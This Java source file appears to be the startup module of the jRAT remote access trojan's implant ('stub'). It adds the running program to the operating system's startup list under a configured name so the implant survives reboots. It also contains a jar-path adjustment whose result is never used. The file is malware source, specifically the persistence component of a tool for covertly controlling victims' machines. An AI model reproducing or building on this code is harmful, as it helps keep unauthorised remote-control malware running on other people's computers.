package io.jrat.stub.modules.startup;

import io.jrat.stub.Configuration;
import io.jrat.stub.utils.Utils;

import java.util.Map;

import startuplib.Startup;

import com.redpois0n.oslib.OperatingSystem;

public class StartupStartupModule extends StartupModule {
	
	public StartupStartupModule(Map<String, String> config) {
		super(config);
	}
	
	public void run() throws Exception {
		String currentJar = Utils.getJarFile().getAbsolutePath();

		try {
			Startup.add(Configuration.name);
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS && currentJar.startsWith("/")) {
			currentJar = currentJar.substring(1, currentJar.length());
		}
	}

}
